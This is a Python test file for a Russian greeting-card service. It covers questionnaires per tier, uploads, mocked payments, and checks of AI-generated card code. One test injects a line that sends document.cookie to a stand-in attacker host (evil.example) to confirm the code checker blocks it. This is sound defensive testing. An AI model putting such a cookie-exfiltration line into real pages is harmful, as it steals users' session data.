"""Все три тарифа: анкеты, загрузки, генерация «Свидания» и «Принца», самопроверка в браузере."""
import asyncio
import json
import os

import httpx
import pytest
from fastapi.testclient import TestClient

from app import checker, generation, llm
from app import yookassa as yk
from app.cards.presets import all_examples
from app.cards.render import render
from app.cards.spec import CardSpec, tier_problems
from app.config import settings
from app.forms import count_kinds, questions_for
from app.main import app
from tests.test_generation import TOKEN, _mock_model
from tests.test_payments import FakeYooKassa, jpeg_bytes, new_order

client = TestClient(app)
os.environ.setdefault("PLAYWRIGHT_BROWSERS_PATH", "/opt/pw-browsers")


def _browser_available() -> bool:
    try:
        from playwright.sync_api import sync_playwright
        with sync_playwright() as p:
            p.chromium.launch().close()
        return True
    except Exception:  # noqa: BLE001
        return False


needs_browser = pytest.mark.skipif(not _browser_available(), reason="нет Chromium для Playwright")

SV_ANSWERS = {"recipient_name": "Лёха", "sender_name": "Дима", "mood": "bright", "symbol": "star", "known": "gt5",
              "loves": ["gamepad", "pizza"], "traits": ["funny"], "places": ["dacha"], "blocks": ["envelope", "polaroids", "quiz"],
              "scene": "highfive", "intro": "joke", "emotion": "laugh", "message": "С днюхой, брат", "secret": "палатка в реке",
              "memory": "поход 2015", "wish": "не теряться", "decor": "balloons"}


@pytest.fixture(autouse=True)
def no_pipeline(monkeypatch):
    async def fake_notify(order):
        pass
    monkeypatch.setattr(generation, "notify_pipeline", fake_notify)


def make_paid(monkeypatch, tier, recipient, occasion, tone, answers, n_photos=3, refs=0, music=False):
    f = FakeYooKassa()
    monkeypatch.setattr(yk, "yookassa", yk.YooKassa(transport=httpx.MockTransport(f.handler)))
    oid = new_order(tier, recipient=recipient, occasion=occasion, tone=tone)["order_id"]
    for i in range(n_photos):
        assert client.post(f"/api/orders/{oid}/files/photos", files={"file": ("a.jpg", jpeg_bytes((40 * i, 90, 160)), "image/jpeg")}).status_code == 200
    for i in range(refs):
        assert client.post(f"/api/orders/{oid}/files/refs", files={"file": ("r.jpg", jpeg_bytes((200, 40 * i, 60)), "image/jpeg")}).status_code == 200
    if music:
        assert client.post(f"/api/orders/{oid}/files/music", files={"file": ("m.mp3", b"ID3" + b"\0" * 2000, "audio/mpeg")}).status_code == 200
    r = client.put(f"/api/orders/{oid}/answers", json={"answers": answers, "complete": True, "pd_consent": True})
    assert r.status_code == 200, r.text
    client.post(f"/api/orders/{oid}/pay", json={"email": "a@example.com"})
    pid = list(f.payments)[0]
    f.succeed(pid)
    client.post("/yookassa/webhook", json={"event": "payment.succeeded", "object": {"id": pid}})
    return oid


# ---------- анкеты ----------

@pytest.mark.parametrize("tier,buttons,texts", [("zapiska", 9, 2), ("svidanie", 19, 5), ("prince", 29, 10)])
def test_question_counts_match_tiers(tier, buttons, texts):
    for r in ("partner", "parent", "colleague"):
        b, t = count_kinds(questions_for(tier, r, "birthday"))
        assert b >= buttons and t == texts


def test_couple_scene_only_offered_to_partner():
    sc = lambda r: next(q for q in questions_for("svidanie", r, "birthday") if q["id"] == "scene")  # noqa: E731
    assert "couple" in [o[0] for o in sc("partner")["options"]]
    assert "couple" not in [o[0] for o in sc("parent")["options"]]


def test_tier_upload_limits():
    z = new_order("zapiska")["order_id"]
    assert client.post(f"/api/orders/{z}/files/refs", files={"file": ("r.jpg", jpeg_bytes(), "image/jpeg")}).status_code == 422
    assert client.post(f"/api/orders/{z}/files/music", files={"file": ("m.mp3", b"ID3xx", "audio/mpeg")}).status_code == 422
    s = new_order("svidanie", recipient="friend", tone="friendly")["order_id"]
    for _ in range(7):
        assert client.post(f"/api/orders/{s}/files/photos", files={"file": ("a.jpg", jpeg_bytes(), "image/jpeg")}).status_code == 200
    assert client.post(f"/api/orders/{s}/files/photos", files={"file": ("a.jpg", jpeg_bytes(), "image/jpeg")}).status_code == 422
    p = new_order("prince", recipient="partner", occasion="anniversary", tone="romantic")["order_id"]
    assert client.post(f"/api/orders/{p}/files/music", files={"file": ("x.mp3", b"not audio", "audio/mpeg")}).status_code == 422
    r = client.post(f"/api/orders/{p}/files/music", files={"file": ("m.mp3", b"ID3" + b"\0" * 100, "audio/mpeg")})
    name = r.json()["music"]
    got = client.get(f"/f/{p}/{name}")
    assert got.status_code == 200 and got.headers["content-type"] == "audio/mpeg"


def test_prince_requires_music_file_when_chosen():
    p = new_order("prince", recipient="partner", occasion="anniversary", tone="romantic")["order_id"]
    client.post(f"/api/orders/{p}/files/photos", files={"file": ("a.jpg", jpeg_bytes(), "image/jpeg")})
    r = client.put(f"/api/orders/{p}/answers", json={"answers": {**SV_ANSWERS, "scene": "couple", "music": "own"},
                                                     "complete": True, "pd_consent": True})
    assert r.status_code == 422 and "музык" in r.json()["detail"]


# ---------- «Свидание» ----------

def test_svidanie_fake_flow(monkeypatch):
    monkeypatch.setattr(settings, "llm_fake", True)
    oid = make_paid(monkeypatch, "svidanie", "friend", "birthday", "friendly", SV_ANSWERS, n_photos=3)
    r = client.post(f"/internal/orders/{oid}/generate", headers=TOKEN).json()
    assert r["status"] == "ready", r
    html = client.get(f"/order/{oid}/card").text
    assert 'class="stack"' in html and 'class="quiz"' in html
    assert html.count(f"/f/{oid}/p_") >= 3


def test_svidanie_sends_photos_to_model_and_enforces_choices(monkeypatch):
    oid = make_paid(monkeypatch, "svidanie", "parent", "birthday", "family", {**SV_ANSWERS, "scene": "hug", "mood": "warm"}, n_photos=2)
    spec = all_examples()["svidanie_friend"]["spec"]
    spec = json.loads(json.dumps(spec))
    spec["blocks"][2]["items"] = [{"photo": 0, "caption": "раз"}, {"photo": 1, "caption": "два"}]
    spec["blocks"][-2]["scene"] = "couple"  # модель «ошиблась» — сервер вернёт выбор пользователя
    sent = _mock_model(monkeypatch, [json.dumps(spec, ensure_ascii=False)])
    r = client.post(f"/internal/orders/{oid}/generate", headers=TOKEN).json()
    assert r["status"] == "ready", r
    content = sent[0]["messages"][0]["content"]
    assert sum(c["type"] == "image" for c in content) == 2  # нейросеть видит оба фото
    html = client.get(f"/order/{oid}/card").text
    assert 'class="person hl"' in html  # сцена — как выбрал пользователь
    assert "--bg:#f6ece2" in html       # тема «Тёплое» (cream_rose), а не из примера


def test_svidanie_missing_photo_triggers_retry(monkeypatch):
    oid = make_paid(monkeypatch, "svidanie", "friend", "birthday", "friendly", SV_ANSWERS, n_photos=3)
    spec = json.loads(json.dumps(all_examples()["svidanie_friend"]["spec"]))
    bad = json.loads(json.dumps(spec))
    bad["blocks"][2]["items"] = [{"photo": 0, "caption": "только одно"}]
    sent = _mock_model(monkeypatch, [json.dumps(bad), json.dumps(spec)])
    assert client.post(f"/internal/orders/{oid}/generate", headers=TOKEN).json()["status"] == "ready"
    assert len(sent) == 2 and "не показаны фото" in sent[1]["messages"][-1]["content"]


def test_custom_blocks_not_allowed_below_prince():
    spec = CardSpec.model_validate(all_examples()["prince_anniversary"]["spec"])
    assert any("custom" in p for p in tier_problems(spec, "svidanie", 3))
    assert tier_problems(spec, "prince", 3) == []


# ---------- «Принц» ----------

def test_code_checks_block_network_and_globals():
    spec = json.loads(json.dumps(all_examples()["prince_anniversary"]["spec"]))
    c = next(b for b in spec["blocks"] if b["type"] == "custom")
    assert checker.code_problems(CardSpec.model_validate(spec)) == []
    c["js"] += "\nfetch('https://evil.example/x?'+document.cookie)"
    c["css"] = c["css"].replace("#cx .sky", ".sky", 1) + "body{background:url(https://x.y/a.png)}"
    probs = " ".join(checker.code_problems(CardSpec.model_validate(spec)))
    assert "fetch" in probs and "cookie" in probs and "внешние" in probs


@needs_browser
def test_checker_on_example_card():
    spec = CardSpec.model_validate(all_examples()["prince_anniversary"]["spec"])
    rep = asyncio.run(checker.check_card(render(spec, [], recipient="partner", inline=True)))
    assert rep.errors == [] and rep.overflow == 0 and rep.clipped == []
    assert any("свой блок" in label for label, _ in rep.shots)


@needs_browser
def test_checker_catches_broken_custom_block():
    spec = json.loads(json.dumps(all_examples()["prince_anniversary"]["spec"]))
    c = next(b for b in spec["blocks"] if b["type"] == "custom")
    c["js"] = "root.querySelector('.nope').click();"
    c["css"] += "#cx .sky{width:900px}"
    rep = asyncio.run(checker.check_card(render(CardSpec.model_validate(spec), [], recipient="partner", inline=True)))
    assert rep.errors and rep.overflow == 0 and rep.clipped  # прокрутки нет (страница защищена), но обрезку видно
    assert len(rep.hard_problems) >= 2


@needs_browser
def test_prince_generation_with_self_check(monkeypatch):
    answers = {**SV_ANSWERS, "scene": "couple", "mood": "festive", "custom_count": "1", "music": "own",
               "palette_own": "own", "color1": "#aa3355", "color2": "#ffccdd", "story": "познакомились на крыше"}
    oid = make_paid(monkeypatch, "prince", "partner", "anniversary", "romantic", answers, n_photos=3, refs=2, music=True)
    spec = json.loads(json.dumps(all_examples()["prince_anniversary"]["spec"]))
    evil = json.loads(json.dumps(spec))
    next(b for b in evil["blocks"] if b["type"] == "custom")["js"] += "\nfetch('/x')"
    review_ok = json.dumps({"verdict": "ok", "problems": [], "spec": None})
    sent = _mock_model(monkeypatch, [json.dumps(evil), json.dumps(spec), review_ok])
    r = client.post(f"/internal/orders/{oid}/generate", headers=TOKEN).json()
    assert r["status"] == "ready", r
    assert "нельзя fetch" in sent[1]["messages"][-1]["content"]          # плохой код отправлен на исправление
    first = sent[0]["messages"][0]["content"]
    assert sum(c["type"] == "image" for c in first) == 5                  # 3 фото + 2 референса
    review = sent[2]["messages"][0]["content"]
    assert any(c["type"] == "image" for c in review)                      # модель смотрит скриншоты
    assert r["usage"]["check"][0]["verdict"] == "ok"
    html = client.get(f"/order/{oid}/card")
    assert "connect-src 'none'" in html.headers["content-security-policy"]
    assert 'id="bgm"' in html.text and "--accent:#aa3355" in html.text   # музыка и свои цвета


def test_prince_romance_for_mom_is_removed(monkeypatch):
    monkeypatch.setattr(settings, "llm_fake", True)
    answers = {**SV_ANSWERS, "scene": "hug", "mood": "warm", "custom_count": "2", "music": "none"}
    oid = make_paid(monkeypatch, "prince", "parent", "birthday", "family", answers, n_photos=2)
    assert client.post(f"/internal/orders/{oid}/generate", headers=TOKEN).json()["status"] == "ready"
    html = client.get(f"/order/{oid}/card").text
    assert 'class="person pl"' not in html and html.count('class="custom cx"') == 2
